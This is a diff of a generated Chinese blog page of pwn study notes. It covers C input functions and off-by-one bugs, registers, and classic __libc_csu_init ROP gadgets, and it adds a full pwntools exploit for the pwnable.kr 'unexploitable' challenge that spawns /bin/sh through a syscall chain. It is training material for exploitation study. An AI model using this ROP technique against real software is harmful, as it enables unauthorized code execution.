-<h2 id="read和gets和fgets"><a href="#read和gets和fgets" class="headerlink" title="read和gets和fgets"></a>read和gets和fgets</h2><p>gets: <code>char * gets(char *s)</code></p>
+<h2 id="read和gets和fgets和scanf和getchar"><a href="#read和gets和fgets和scanf和getchar" class="headerlink" title="read和gets和fgets和scanf和getchar"></a>read和gets和fgets和scanf和getchar</h2><ul>
+<li>gets: <code>char * gets(char *s)</code></li>
+</ul>
 <p>读取一个字符串到s指向的内存空间，直到出现换行符读到文件尾为止,最后将换行符替换为NULL做作为字符串结束。<strong>注意，由于gets()函数无法知道读取字符串大小，因此容易出现缓冲区溢出,建议使用fgets替代</strong></p>
-<p>fgets: <code>char *  fgets(char * s, int n,FILE *stream);</code></p>
-<p> 参数; </p>
 <ul>
-<li>s: 字符型指针，指向存储读入数据的缓冲区的地址。</li>
+<li><p>fgets: <code>char *  fgets(char * s, int n,FILE *stream);</code></p>
+<p>参数; </p>
+</li>
+<li><p>s: 字符型指针，指向存储读入数据的缓冲区的地址。</p>
+</li>
 <li>n: 从流中读入n-1个字符</li>
 <li>stream ： 指向读取的流。</li>
 </ul>
 <p>该函数读入n-1个字符或者读到”\n”，然后在最后<strong>添加\x00</strong></p>
-<p>fets函数会开辟一个堆块，作为缓冲区，大小视情况而定，比如：</p>
+<p>fgets函数会开辟一个堆块，作为缓冲区，大小视情况而定，比如：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">int main() &#123;</span><br><span class="line">   char s[20];</span><br><span class="line">   fgets(s, 24, stdin);</span><br><span class="line">   printf(&quot;%s\n&quot;, s);</span><br><span class="line">   fgets(s, 24, stdin);</span><br><span class="line">   printf(&quot;%s&quot;, s);</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>第一次输入<em>23 \</em> ‘a’ + ‘b’ + 22 * ‘b’*，字符串首先会被读到位于堆中的缓冲区里边，再从缓冲区读取到s所在地址，该字符串超过23个字节，所以第二次执行fgets的时候，将不在需要用户输入，直接从第24位开始读取。</p>
+<p>第一次输入<code>23 * &#39;a&#39; + &#39;b&#39; + 22 \* &#39;b&#39;</code>，字符串首先会被读到位于堆中的缓冲区里边，再从缓冲区读取到s所在地址，该字符串超过23个字节，所以第二次执行fgets的时候，将不在需要用户输入，直接从第24位开始读取。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">qianfa@qianfa:~/Desktop/huwangbei$ ./test </span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaabaaaaaaaaaaaaaaaaaaaaaa </span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">baaaaaaaaaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure>
-<p>read: <code>ssize_t read(int fd, void *buf, size_t count);</code></p>
-<p>读取cout个字符。直接从流中读取count个字节到buf中。    </p>
-<p><strong>scanf</strong>:  char s[20]; scanf(“%20s”, s); scanf遇到<strong>空格</strong>，不满20位，“\t”, “\n”等会停止，添加”\x00”，如果输入大于或者等于20,那么会使得s[20] = “\x00”，也就是存在off_by_one。</p>
+<ul>
+<li>read: <code>ssize_t read(int fd, void *buf, size_t count);</code></li>
+</ul>
+<p>读取cout个字符。直接从流中读取count个字节到buf中。一般不会出现off_by_one</p>
+<ul>
+<li>strcpy</li>
+</ul>
+<p>会复制’\x00’,可能导致off_by_one</p>
+<ul>
+<li>scanf: </li>
+</ul>
+<p>char s[20]; scanf(“%20s”, s); scanf遇到<strong>空格</strong>，不满20位，“\t”, “\n”等会停止，添加”\x00”，如果输入大于或者等于20,那么会使得s[20] = “\x00”，也就是存在off_by_one。该函数在输入的数据过长时，比如0x500,也会开启一个堆块，作为缓冲区,但会立即释放。</p>
+<ul>
+<li>getchar():</li>
+</ul>
+<p>getchar 也会开辟一个堆块，作为缓冲区，不会释放。</p>
 <h2 id="mmap分配问题"><a href="#mmap分配问题" class="headerlink" title="mmap分配问题"></a>mmap分配问题</h2><p>当mmap的地址是urandom来的，但是不满足mmap要求时，会随机分配这个地址，申请两块同样大小的mmap内存时，若两次mmap的随机地址都已分配，则会造成两处内存空间相邻。</p>
 <h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>AH&amp;AL=AX(accumulator):累加寄存器<br>BH&amp;BL=BX(base):基址寄存器<br>CH&amp;CL=CX(count):计数寄存器<br>DH&amp;DL=DX(data):数据寄存器<br>SP(Stack Pointer):堆栈指针寄存器<br>BP(Base Pointer):基址指针寄存器<br>SI(Source Index):源变址寄存器<br>DI(Destination Index):目的变址寄存器<br>IP(Instruction Pointer):指令指针寄存器<br>CS(Code Segment)代码段寄存器<br>DS(Data Segment):数据段寄存器<br>SS(Stack Segment):堆栈段寄存器<br>ES(Extra Segment):附加段寄存器</p>
 <p>32位CPU有4个32位的通用寄存器EAX、EBX、ECX和EDX。对低16位数据的存取，不会影响高16位的数据。这些低16位寄存器分别命名为：AX、BX、CX和DX，它和先前的CPU中的寄存器相一致。</p>
 <p>4个16位寄存器又可分割成8个独立的8位寄存器(AX：AH-AL、BX：BH-BL、CX：CH-CL、DX：DH-DL)，每个寄存器都有自己的名称，可独立存取。程序员可利用数据寄存器的这种“可分可合”的特性，灵活地处理字/字节的信。</p>
 <h2 id="glibc中各种bin的划分"><a href="#glibc中各种bin的划分" class="headerlink" title="glibc中各种bin的划分"></a>glibc中各种bin的划分</h2><p>64位: fastbins [0x20 ~ 0x80] ，步长 0x10</p>
+<h2 id="经典ROP-gadgets"><a href="#经典ROP-gadgets" class="headerlink" title="经典ROP gadgets"></a>经典ROP gadgets</h2><ol>
+<li>__libc_csu_init方法</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005E6                 mov     rbx, [rsp+38h+var_30]</span><br><span class="line">.text:00000000004005EB                 mov     rbp, [rsp+38h+var_28]</span><br><span class="line">.text:00000000004005F0                 mov     r12, [rsp+38h+var_20]</span><br><span class="line">.text:00000000004005F5                 mov     r13, [rsp+38h+var_18]</span><br><span class="line">.text:00000000004005FA                 mov     r14, [rsp+38h+var_10]</span><br><span class="line">.text:00000000004005FF                 mov     r15, [rsp+38h+var_8]</span><br><span class="line">.text:0000000000400604                 add     rsp, 38h</span><br><span class="line">.text:0000000000400608                 retn</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005D0                 mov     rdx, r15</span><br><span class="line">.text:00000000004005D3                 mov     rsi, r14</span><br><span class="line">.text:00000000004005D6                 mov     edi, r13d</span><br><span class="line">.text:00000000004005D9                 call    qword ptr [r12+rbx*8]</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>一般存在”pop r15;ret” 也就存在”pop rdi;ret;”</li>
+</ol>
+<p>pwnable.kr-unexploitable 的exp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./unexploitable&quot;)</span><br><span class="line">elf = ELF(&quot;./unexploitable&quot;)</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">pop_rbp = 0x400512</span><br><span class="line">leave_ret = 0x400576</span><br><span class="line">syscall_addr = 0x400560</span><br><span class="line">bss_addr = 0x601028 + 0x200</span><br><span class="line">sh_addr = 0x601028 + 0x400</span><br><span class="line"># rdi, rsi, rdx, rcx, r8, r9</span><br><span class="line"> </span><br><span class="line">gadget_1 = 0x4005e6</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">   0x00000000004005e6 &lt;+102&gt;:   mov    rbx,QWORD PTR [rsp+0x8]</span><br><span class="line">   0x00000000004005eb &lt;+107&gt;:   mov    rbp,QWORD PTR [rsp+0x10]</span><br><span class="line">   0x00000000004005f0 &lt;+112&gt;:   mov    r12,QWORD PTR [rsp+0x18]</span><br><span class="line">   0x00000000004005f5 &lt;+117&gt;:   mov    r13,QWORD PTR [rsp+0x20]</span><br><span class="line">   0x00000000004005fa &lt;+122&gt;:   mov    r14,QWORD PTR [rsp+0x28]</span><br><span class="line">   0x00000000004005ff &lt;+127&gt;:   mov    r15,QWORD PTR [rsp+0x30]</span><br><span class="line">   0x0000000000400604 &lt;+132&gt;:   add    rsp,0x38</span><br><span class="line">   0x0000000000400608 &lt;+136&gt;:   ret </span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"> </span><br><span class="line">gadget_2 = 0x4005d0</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">   0x00000000004005d0 &lt;+80&gt;:    mov    rdx,r15</span><br><span class="line">   0x00000000004005d3 &lt;+83&gt;:    mov    rsi,r14</span><br><span class="line">   0x00000000004005d6 &lt;+86&gt;:    mov    edi,r13d</span><br><span class="line">   0x00000000004005d9 &lt;+89&gt;:    call   QWORD PTR [r12+rbx*8]</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"> </span><br><span class="line">def call_function(call_addr, arg1, arg2, arg3):</span><br><span class="line">    payload = &quot;&quot;</span><br><span class="line">    payload += p64(gadget_1)    # =&gt; rsp</span><br><span class="line">    payload += &quot;A&quot; * 8</span><br><span class="line">    payload += p64(0)           # =&gt; rbx</span><br><span class="line">    payload += p64(1)           # =&gt; 1</span><br><span class="line">    payload += p64(call_addr)   # =&gt; r12 =&gt; call addr</span><br><span class="line">    payload += p64(arg1)        # =&gt; r13 =&gt; edi =&gt; rdi</span><br><span class="line">    payload += p64(arg2)        # =&gt; r14 =&gt; rsi</span><br><span class="line">    payload += p64(arg3)        # =&gt; r15 =&gt; rdx</span><br><span class="line">    payload += p64(gadget_2)    # =&gt; rsp + 38</span><br><span class="line">    payload += &quot;C&quot; * 0x38</span><br><span class="line">    return payload</span><br><span class="line">    </span><br><span class="line"># use read to set rax as 0x59</span><br><span class="line">payload1 = &quot;A&quot; * 0x10 + p64(bss_addr) # &quot;A&quot; * 0x10 + p64(0) is ok too</span><br><span class="line">payload1 += call_function(elf.got[&apos;read&apos;], 0, bss_addr, 0x200)</span><br><span class="line">payload1 += p64(pop_rbp)</span><br><span class="line">payload1 += p64(bss_addr)</span><br><span class="line">payload1 += p64(leave_ret)</span><br><span class="line"></span><br><span class="line">payload2 = p64(bss_addr + 0x8)       # p64(0x0)  is ok too</span><br><span class="line">payload2 += call_function(elf.got[&quot;read&quot;], 0, sh_addr, 0x200)</span><br><span class="line">payload2 += call_function(sh_addr+0x10, sh_addr, 0, 0)</span><br><span class="line">print len(payload2)</span><br><span class="line">payload3 = &quot;/bin/sh\x00&quot;.ljust(0x10, &quot;B&quot;)</span><br><span class="line">payload3 += p64(syscall_addr)</span><br><span class="line">payload3 = payload3.ljust(59, &quot;D&quot;)</span><br><span class="line"></span><br><span class="line">sleep(3)</span><br><span class="line">io.send(payload1)</span><br><span class="line">io.send(payload2)</span><br><span class="line">io.send(payload3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 <h2 id="汇编指令大全"><a href="#汇编指令大全" class="headerlink" title="汇编指令大全"></a>汇编指令大全</h2><table>
 <thead>
 <tr>
@@ -634,6 +724,8 @@
 </tr>
 </tbody>
 </table>
+<h2 id="syscall调用方法"><a href="#syscall调用方法" class="headerlink" title="syscall调用方法:"></a>syscall调用方法:</h2><p>调用好保存在rax中，参数设置方式参照调用约定。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">4000b0:	48 31 c0             	xor    %rax,%rax</span><br><span class="line">4000b3:	ba 00 04 00 00       	mov    $0x400,%edx</span><br><span class="line">4000b8:	48 89 e6             	mov    %rsp,%rsi</span><br><span class="line">4000bb:	48 89 c7             	mov    %rax,%rdi</span><br><span class="line">4000be:	0f 05                	syscall        # 调用read</span><br></pre></td></tr></table></figure>
 <h2 id="syscall调用表"><a href="#syscall调用表" class="headerlink" title="syscall调用表"></a>syscall调用表</h2><table>
 <thead>
 <tr>
@@ -4078,7 +4170,7 @@
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#调用约定"><span class="toc-number">1.</span> <span class="toc-text">调用约定</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查找libc基地址"><span class="toc-number">2.</span> <span class="toc-text">查找libc基地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查找”-bin-sh”的偏移地址"><span class="toc-number">3.</span> <span class="toc-text">查找”/bin/sh”的偏移地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反汇编代码"><span class="toc-number">4.</span> <span class="toc-text">反汇编代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#在可执行文件中找gadget"><span class="toc-number">5.</span> <span class="toc-text">在可执行文件中找gadget</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode编写"><span class="toc-number">6.</span> <span class="toc-text">shellcode编写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#retn和leave和call"><span class="toc-number">7.</span> <span class="toc-text">retn和leave和call</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#32位寻找偏移"><span class="toc-number">8.</span> <span class="toc-text">32位寻找偏移</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#有符号整数比较和无符号整数比较"><span class="toc-number">9.</span> <span class="toc-text">有符号整数比较和无符号整数比较</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查找argv-0-变量的地址"><span class="toc-number">10.</span> <span class="toc-text">查找argv[0]变量的地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ubuntu-16-64位默认加载地址"><span class="toc-number">11.</span> <span class="toc-text">ubuntu 16  64位默认加载地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ida调试elf文件"><span class="toc-number">12.</span> <span class="toc-text">ida调试elf文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec检测到的保护机制"><span class="toc-number">13.</span> <span class="toc-text">checksec检测到的保护机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gdb中print和x的区别"><span class="toc-number">14.</span> <span class="toc-text">gdb中print和x的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#read和gets和fgets"><span class="toc-number">15.</span> <span class="toc-text">read和gets和fgets</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mmap分配问题"><span class="toc-number">16.</span> <span class="toc-text">mmap分配问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#寄存器"><span class="toc-number">17.</span> <span class="toc-text">寄存器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#glibc中各种bin的划分"><span class="toc-number">18.</span> <span class="toc-text">glibc中各种bin的划分</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#汇编指令大全"><span class="toc-number">19.</span> <span class="toc-text">汇编指令大全</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#syscall调用表"><span class="toc-number">20.</span> <span class="toc-text">syscall调用表</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#硬中断和软中断"><span class="toc-number">1.</span> <span class="toc-text">硬中断和软中断</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#软中断"><span class="toc-number">1.1.</span> <span class="toc-text">软中断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#硬中断"><span class="toc-number">1.2.</span> <span class="toc-text">硬中断:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#安装seccomp-tools"><span class="toc-number">2.</span> <span class="toc-text">安装seccomp-tools</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#overlapping方法"><span class="toc-number">3.</span> <span class="toc-text">overlapping方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwngdb-打断点"><span class="toc-number">4.</span> <span class="toc-text">pwngdb 打断点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#调用约定"><span class="toc-number">5.</span> <span class="toc-text">调用约定</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查找libc基地址"><span class="toc-number">6.</span> <span class="toc-text">查找libc基地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查找”-bin-sh”的偏移地址"><span class="toc-number">7.</span> <span class="toc-text">查找”/bin/sh”的偏移地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反汇编代码"><span class="toc-number">8.</span> <span class="toc-text">反汇编代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#在可执行文件中找gadget"><span class="toc-number">9.</span> <span class="toc-text">在可执行文件中找gadget</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#32位shellcode"><span class="toc-number">10.</span> <span class="toc-text">32位shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#64位shellcode"><span class="toc-number">11.</span> <span class="toc-text">64位shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode编写"><span class="toc-number">12.</span> <span class="toc-text">shellcode编写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#retn和leave和call"><span class="toc-number">13.</span> <span class="toc-text">retn和leave和call</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#32位寻找偏移"><span class="toc-number">14.</span> <span class="toc-text">32位寻找偏移</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#有符号整数比较和无符号整数比较"><span class="toc-number">15.</span> <span class="toc-text">有符号整数比较和无符号整数比较</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查找argv-0-变量的地址"><span class="toc-number">16.</span> <span class="toc-text">查找argv[0]变量的地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ubuntu-16-64位默认加载地址"><span class="toc-number">17.</span> <span class="toc-text">ubuntu 16  64位默认加载地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ida调试elf文件"><span class="toc-number">18.</span> <span class="toc-text">ida调试elf文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec检测到的保护机制"><span class="toc-number">19.</span> <span class="toc-text">checksec检测到的保护机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gdb中print和x的区别"><span class="toc-number">20.</span> <span class="toc-text">gdb中print和x的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#read和gets和fgets和scanf和getchar"><span class="toc-number">21.</span> <span class="toc-text">read和gets和fgets和scanf和getchar</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mmap分配问题"><span class="toc-number">22.</span> <span class="toc-text">mmap分配问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#寄存器"><span class="toc-number">23.</span> <span class="toc-text">寄存器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#glibc中各种bin的划分"><span class="toc-number">24.</span> <span class="toc-text">glibc中各种bin的划分</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#经典ROP-gadgets"><span class="toc-number">25.</span> <span class="toc-text">经典ROP gadgets</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#汇编指令大全"><span class="toc-number">26.</span> <span class="toc-text">汇编指令大全</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#syscall调用方法"><span class="toc-number">27.</span> <span class="toc-text">syscall调用方法:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#syscall调用表"><span class="toc-number">28.</span> <span class="toc-text">syscall调用表</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -4926,9 +5018,261 @@
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 57
+        Total : 71
         </div>
         <!-- search  -->
         
@@ -4939,8 +5283,97 @@
     
     
     
+    <div class="archive-year"> 2099 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href="/posts/30918/">day-day-up</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/05</span><a class="archive-post-title" href="/posts/31116/">ctf题目-php调试分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/05</span><a class="archive-post-title" href="/posts/36891/">php7.2内核调试环境搭建</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/04</span><a class="archive-post-title" href="/posts/46756/">linux-优化实战笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/02</span><a class="archive-post-title" href="/posts/41159/">RealWorldFinal</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/01</span><a class="archive-post-title" href="/posts/4968/">pwnable.tw练习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/29</span><a class="archive-post-title" href="/posts/48844/">bctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/28</span><a class="archive-post-title" href="/posts/59263/">安全设备名词解释</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/28</span><a class="archive-post-title" href="/posts/23961/">安全域划分的相关问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/25</span><a class="archive-post-title" href="/posts/16617/">code-breaking</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/19</span><a class="archive-post-title" href="/posts/3376/">lctf-2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/16</span><a class="archive-post-title" href="/posts/62306/">babystack-ret2dlsolve</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/11</span><a class="archive-post-title" href="/posts/49484/">hctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/04</span><a class="archive-post-title" href="/posts/59104/">SROP-study</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/posts/19071/">tcache-study</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/posts/54250/">house_of_roman</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -4950,11 +5383,6 @@
     
         <li class="archive-post-item">
             <span class="archive-post-date">10/17</span><a class="archive-post-title" href="/posts/30021/">hack-lu</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">10/17</span><a class="archive-post-title" href="/posts/15111/">护网杯pwn-study</a>
         </li>
     
     
@@ -4974,7 +5402,7 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/22</span><a class="archive-post-title" href="/posts/45708/">anheng9</a>
+            <span class="archive-post-date">09/22</span><a class="archive-post-title" href="/posts/45708/">anheng</a>
         </li>
     
     
@@ -5094,17 +5522,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/30</span><a class="archive-post-title" href="/posts/29914/">ssrf+gopher</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">06/26</span><a class="archive-post-title" href="/posts/22546/">googlectf2018</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/24</span><a class="archive-post-title" href="/posts/9490/">proc的作用</a>
+            <span class="archive-post-date">06/24</span><a class="archive-post-title" href="/posts/9490/">linux常见文件的作用</a>
         </li>
     
     
@@ -5149,12 +5572,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
         </li>
     
     
@@ -5174,7 +5597,7 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/21</span><a class="archive-post-title" href="/posts/32791/">bypassaslr_1</a>
+            <span class="archive-post-date">05/21</span><a class="archive-post-title" href="/posts/32791/">bypassaslr_return2plt</a>
         </li>
     
     
@@ -5232,19 +5655,25 @@
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
+        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+    
         <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
     
         <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
     
-        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+        <span class="sidebar-tag-name" data-tags="ctf_php_debug"><span class="iconfont-archer">&#xe606;</span>ctf_php_debug</span>
     
         <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
     
+        <span class="sidebar-tag-name" data-tags="置顶"><span class="iconfont-archer">&#xe606;</span>置顶</span>
+    
         <span class="sidebar-tag-name" data-tags="dubbo"><span class="iconfont-archer">&#xe606;</span>dubbo</span>
+    
+        <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
     
         <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
     
-        <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
